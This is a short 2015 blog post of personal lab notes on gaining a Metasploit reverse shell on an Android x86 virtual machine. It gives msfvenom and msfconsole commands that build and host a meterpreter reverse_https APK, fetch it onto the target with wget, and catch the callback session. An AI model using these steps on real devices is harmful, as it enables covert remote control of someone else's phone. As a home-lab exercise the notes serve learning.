---
title: 'Reverse Shell on Android'
date: 2015-12-29T16:14:00.001Z
draft: false
aliases: [ "/2015/12/reverse-shell-on-android.html" ]
parent: Blogger
---
#### date: 2015-12-29

Notes on gaining reverse shell to android using metasploit, these notes are to remind me some time in the future once I've forgotten what I did because I seem to do that these days :)  
  
Requirements  
VirtualBox  
VM: Kali Linux 2.0  
VM: Android x86 5.1 (must use PCNET single adapter for ethernet 'host only' and set graphics ram to max 128mb)  
  
Setup Services on Kali;  
\# service apache2 start  
\# ifconfig #note your IP  
\# msfvenom -p android/meterpreter/reverse\_https LHOST=(IP FROM ABOVE) LPORT=8443 R > androidshell.apk  
eg #msfvenom -p android/meterpreter/reverse\_https LHOST=192.168.56.100 LPORT=8443 R > androidshell.apk  
\# cp androidshell.apk /var/www/html/  
Open metasploit framework and in msfconsole enter;  
msf> use exploit/multi/handler  
msf> set PAYLOAD android/meterpreter/reverse\_https  
msf> set LHOST (IP Noted from above)  
eg msf> set LHOST 192.168.56.100  
msf> set ExitOnSession false  
msf> exploit -j -z  
  
  
Target Android Device  
http://www.android-x86.org/documents/virtualboxhowto  
http://www.android-x86.org/documents/installhowto  
  
Once installed open termimal emulator and use following commands to setup the networking;  
$ su  
\# netcfg  
\# netcfg eth1 up  
\# netcfg eth1 dhcp  
\# ping \[serverIP\]  
\# cd /sdcard/Download/  
\# wget http://(ip addy)/android\_shell.apk  
eg # wget http://192.168.56.100/android\_shell.apk  
  
switch back to home screen and open the file manager then browse to the downloads and open the APK, you will be warned about your settings so go ahead and enable 'unknown sources'  
  
if you restart the client you will need to open the app 'MainActivity' to reconnect. There might be some scripts to make it persist a little but reboots will wipe the connection.  
  
on kali you can use msf> sessions -i 1   #change number according to session you want to connect to.